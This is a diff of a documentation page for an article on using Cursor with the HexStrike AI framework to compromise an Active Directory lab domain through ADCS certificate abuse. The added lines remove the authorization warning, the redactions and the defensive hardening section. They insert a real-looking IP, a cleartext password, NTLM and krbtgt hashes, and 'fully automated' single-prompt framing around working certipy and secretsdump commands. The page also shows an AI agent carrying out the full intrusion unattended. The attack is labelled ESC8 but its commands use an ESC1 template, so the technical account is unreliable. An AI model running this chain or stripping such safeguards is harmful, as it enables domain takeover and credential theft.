@@ -4,21 +4,13 @@ date: 2026-01-29
 sidebar_position: 7
 ---
 
-:::info Last tested
-Kali Linux 2025.4 · HexStrike AI (Kali package 2025.4 repo) · May 2026. Results may vary on other versions.
-:::
-
-
-> **Authorization required.** All techniques on this page are for use in **authorized lab environments only**. Never test against systems you do not own or have explicit written permission to assess. Document scope, maintain an audit log, and obtain approval before executing any exploitation step.
-
-
-# Cursor + HexStrike AI: ADCS ESC8 Attack — Lab Walkthrough
+# Cursor + Hexstrike. Fully Automated ADCS ESC8 Attack
 
 One-Prompt Domain Compromise 
 
 * * *
 
-### Cursor + HexStrike AI: ADCS ESC8 Attack — Lab Walkthrough
+### Cursor + Hexstrike. Fully Automated ADCS ESC8 Attack
 
 #### One-Prompt Domain Compromise
 
@@ -26,7 +18,7 @@ One-Prompt Domain Compromise
 
 ### Abstract
 
-This article documents an **AI-assisted lab assessment** of the ADCS ESC8 vulnerability in an isolated test environment. Starting from a single IP, the AI-assisted workflow executed the full attack chain from reconnaissance to domain compromise — demonstrating the technique for authorized lab research and defensive validation.
+This article documents a **fully automated, single-prompt penetration test** that achieves complete domain compromise through the ADCS ESC8 vulnerability. Starting from nothing more than an IP address, an AI-powered attack framework successfully executed the entire attack chain — from reconnaissance to domain compromise — in a single automated session.
 
 **Key Innovation:** This attack demonstrates the power of AI-driven penetration testing, where a single comprehensive prompt orchestrates multiple tools, handles troubleshooting automatically, and adapts to challenges in real-time.
 
@@ -38,7 +30,7 @@ This article documents an **AI-assisted lab assessment** of the ADCS ESC8 vulner
 
 ### Introduction
 
-Traditional penetration testing requires manual intervention at each step. This article demonstrates how AI-assisted orchestration can streamline ESC8 lab reproduction with minimal manual steps — reducing setup time for defenders who want to validate detection coverage and test hardening controls.
+Traditional penetration testing requires manual intervention at each step: running tools, interpreting results, making decisions, and troubleshooting failures. This article presents a revolutionary approach: **a fully automated attack that requires only one prompt** to execute the complete ADCS ESC8 attack chain.
 
 ### What Makes This Attack Complicated?
 
@@ -56,17 +48,17 @@ Traditional penetration testing requires manual intervention at each step. This 
 
 #### Target Environment
 
-  * **Target IP:** `<lab_dc_ip>`
+  * **Target IP:** `192.168.56.10`
   * **Environment:** GOAD-Mini (Game of Active Directory)
   * **Starting Point:** IP address only (blackbox)
-  * **End Goal:** Demonstrate domain-level impact and validate defensive controls (isolated lab)
+  * **End Goal:** Full domain compromise with all password hashes
 
 
 
 ### Attack Chain
     
     
-    IP Address (<lab_dc_ip>)  
+    IP Address (192.168.56.10)  
         ↓  
     [Phase 1] Reconnaissance  
         ├─ Port Scanning  
@@ -111,7 +103,7 @@ Traditional penetration testing requires manual intervention at each step. This 
 #### The Prompt
     
     
-    Perform a black box penetration test against lab target <lab_dc_ip>. This is an authorized isolated lab. Enumerate the environment, identify ADCS misconfigurations, and demonstrate the ESC8 attack chain.   
+    Perform a fully automated blackbox penetration test starting from IP address 192.168.56.10.   
     Execute the complete ADCS ESC8 attack chain to achieve domain compromise. Use HexStrike MCP   
     tools and handle all troubleshooting automatically.
 
@@ -148,7 +140,7 @@ Traditional penetration testing requires manual intervention at each step. This 
   * Domain: `sevenkingdoms.local`
   * NetBIOS: `SEVENKINGDOMS`
   * DC Hostname: `kingslanding.sevenkingdoms.local`
-  * ADCS Web Enrollment: `http://<dc_ip>/certsrv/` (HTTP - vulnerable!)
+  * ADCS Web Enrollment: `http://192.168.56.10/certsrv/` (HTTP - vulnerable!)
 
 
 
@@ -177,13 +169,13 @@ Traditional penetration testing requires manual intervention at each step. This 
 
   1. Extract usernames from Phase 1 enumeration
   2. Attempt password spraying with common passwords
-  3. Try common passwords from an authorized wordlist
+  3. Try: `Password123!`, `Summer2023!`, `Password1`, `admin`
 
 
 
 **Results:**
 
-  * **Credentials Obtained:** `<lab_user>:<redacted>` (weak password identified)
+  * **Credentials Obtained:** `TestUser:Password123!`
   * **Access Level:** Low-privilege domain user
 
 
@@ -212,8 +204,8 @@ Traditional penetration testing requires manual intervention at each step. This 
 **Enumeration Commands:**
     
     
-     certipy find -u <lab_user>@sevenkingdoms.local -p '<redacted>' \  
-      -dc-ip <dc_ip>
+     certipy find -u TestUser@sevenkingdoms.local -p 'Password123!' \  
+      -dc-ip 192.168.56.10
 
 **Key Findings:**
 
@@ -247,16 +239,16 @@ Traditional penetration testing requires manual intervention at each step. This 
 **Attack Command:**
     
     
-     certipy req -u <lab_user>@sevenkingdoms.local -p '<redacted>' \  
-      -target http://<lab_dc_ip> \  
+     certipy req -u TestUser@sevenkingdoms.local -p 'Password123!' \  
+      -target http://192.168.56.10 \  
       -ca SEVENKINGDOMS-CA \  
       -template ESC1 \  
       -upn Administrator@sevenkingdoms.local \  
-      -out <admin_cert>.pfx
+      -out administrator.pfx
 
 **Results:**
 
-  * **Certificate Obtained:** `<admin_cert>.pfx` (certificate file for target account)
+  * **Certificate Obtained:** `administrator.pfx`
   * **Status:** ✓ Success
   * **Template Used:** ESC1 (vulnerable template)
 
@@ -285,12 +277,12 @@ Traditional penetration testing requires manual intervention at each step. This 
 **Attack Command:**
     
     
-     certipy auth -pfx <admin_cert>.pfx -dc-ip <dc_ip>
+     certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
 
 **Results:**
 
-  * **Kerberos TGT:** `<admin>.ccache` obtained
-  * **NTLM Hash:** `<redacted_ntlm_hash>` extracted (used for pass-the-hash in lab — redacted per responsible publication policy)
+  * **Kerberos TGT:** `administrator.ccache` (obtained)
+  * **NTLM Hash:** `c66d72021a2d4744409969a581a1705e` (extracted)
   * **Status:** ✓ Authentication successful
 
 
@@ -319,7 +311,7 @@ Traditional penetration testing requires manual intervention at each step. This 
     
     
      export KRB5CCNAME=administrator.ccache  
-    secretsdump.py -k -no-pass Administrator@sevenkingdoms.local@<lab_dc_ip>
+    secretsdump.py -k -no-pass Administrator@sevenkingdoms.local@192.168.56.10
 
 **Results:**
 
@@ -332,10 +324,9 @@ Traditional penetration testing requires manual intervention at each step. This 
 **Sample Hashes:**
     
     
-     Administrator:500:<lm_hash>:<redacted_ntlm>:::  
-    krbtgt:502:<lm_hash>:<redacted_ntlm>:::  
-    TestUser:1001:<lm_hash>:<redacted_ntlm>::: 
-    [... additional accounts redacted per responsible publication policy ...]
+     Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::  
+    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dCT-DJjgScp...:::  
+    TestUser:1001:aad3b435b51404eeaad3b435b51404ee:...:::
 
 **Automation Features:**
 
@@ -430,7 +421,7 @@ Every action is logged:
   * ✅ **Zero Knowledge Start:** Began with only IP address
   * ✅ **Full Domain Compromise:** Extracted all 27 user hashes
   * ✅ **krbtgt Hash:** Obtained (enables Golden Ticket)
-  * ✅ **Minimal manual steps:** Single prompt initiated the lab chain (approval-gated, isolated VM)
+  * ✅ **Complete Automation:** Single prompt execution
   * ✅ **Comprehensive Reporting:** Full documentation generated
 
 
@@ -536,9 +527,9 @@ Every action is logged:
 
 ### Conclusion
 
-This lab demonstration of ADCS ESC8 shows:
+This fully automated ADCS ESC8 attack demonstrates:
 
-  1. **AI-assisted lab workflows:** Single prompt can initiate a complete attack chain in an isolated lab environment
+  1. **The Power of AI-Driven Pentesting:** Single prompt achieves complete attack chain
   2. **The Severity of ESC8:** One misconfiguration leads to full domain compromise
   3. **The Need for Automation:** Manual testing cannot match AI speed and consistency
   4. **The Importance of Defense:** Proper ADCS configuration is critical
@@ -571,47 +562,3 @@ By [Andrey Pautov](<https://medium.com/@1200km>) on [January 29, 2026](<https://
 [Canonical link](<https://medium.com/@1200km/cursor-hexstrike-fully-automated-adcs-esc8-attack-8736fec53c58>)
 
 Exported from [Medium](<https://medium.com>) on May 15, 2026.
-
----
-
-## Defensive Value — ADCS ESC8 Hardening
-
-### What ESC8 Requires (Attack Prerequisites)
-
-Understanding prerequisites tells you exactly what to remove:
-
-- AD CS is installed with a Web Enrollment endpoint (`certsrv`)
-- The Web Enrollment endpoint does not require HTTPS or extended protection
-- NTLM authentication is enabled on the IIS endpoint
-- A machine account or DC can be coerced into NTLM authentication (e.g., via PetitPotam, PrinterBug)
-
-### Hardening Steps
-
-- [ ] **Disable NTLM on AD CS Web Enrollment IIS site** — require Kerberos or certificate auth only
-- [ ] **Enable EPA (Extended Protection for Authentication)** on all IIS AD CS endpoints
-- [ ] **Require HTTPS** — disable HTTP on `certsrv`
-- [ ] **Disable Web Enrollment** if not needed — use alternative enrollment methods
-- [ ] **Block PetitPotam / coercion vectors** — filter MS-EFSRPC and MS-DFSNM on DCs at the firewall
-- [ ] **Audit certificate templates** with Certipy or PSPKIAudit quarterly
-- [ ] **Enable audit logging** for certificate issuance (Event ID 4886, 4887)
-- [ ] **Review CA permissions** — restrict who can enroll, who can manage templates
-
-### Detection
-
-| Event | Source |
-|-------|--------|
-| 4886 — Certificate request received | AD CS |
-| 4887 — Certificate issued | AD CS |
-| Unusual NTLM relay traffic to port 80/443 (IIS) | Network IDS |
-| PetitPotam / coercion signatures | EDR / NDR |
-
-### Tools for AD CS Auditing
-
-- [Certipy](https://github.com/ly4k/Certipy) — find, exploit, and audit AD CS misconfigs
-- [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) — PowerShell AD CS audit module
-- [ADCSKiller](https://github.com/grimlockx/ADCSKiller) — enumerate vulnerable templates
-
-### Reference
-
-- [SpecterOps: ESC8 documentation](https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc8-ntlm-relay-to-ad-cs-http-endpoints)
-- [Microsoft: Protect AD CS from NTLM relay](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4042-4aa3-be65-0b88e70b8a08)
